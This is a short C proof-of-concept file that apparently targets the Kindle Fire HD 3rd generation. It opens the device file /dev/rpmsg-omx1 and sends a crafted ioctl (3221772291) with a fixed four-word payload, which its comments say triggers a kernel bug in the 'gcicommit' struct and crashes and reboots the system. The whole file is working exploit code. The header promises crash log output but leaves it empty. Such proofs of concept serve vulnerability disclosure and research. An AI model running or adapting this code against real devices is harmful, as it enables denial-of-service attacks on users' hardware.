/*
 * This is poc of Kindle Fire HD 3rd
 * A bug in the ioctl interface of device file /dev/rpmsg-omx1 causes the system crash via IOCTL 3221772291.
 * Related buggy struct name is gcicommit.
 * This Poc should run with permission to do ioctl on /dev/rpmsg-omx1.
 *
 * The fowllwing is kmsg of kernel crash infomation:
 *
 *
 */
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>

const static char *driver = "/dev/rpmsg-omx1";
static command = 3221772291; 

int main(int argc, char **argv, char **env) {
    unsigned int payload[] = { 0xb5d18de2, 0xf6e48a17, 0x9179c429, 0x89a32e03 };

        int fd = 0;
        fd = open(driver, O_RDWR);
        if (fd < 0) {
            printf("Failed to open %s, with errno %d\n", driver, errno);
            system("echo 1 > /data/local/tmp/log");
            return -1;
        }

        printf("Try open %s with command 0x%x.\n", driver, command);
        printf("System will crash and reboot.\n");
        if(ioctl(fd, command, &payload) < 0) {
            printf("Allocation of structs failed, %d\n", errno);
            system("echo 2 > /data/local/tmp/log");
            return -1;
        }
        close(fd);
        return 0;
}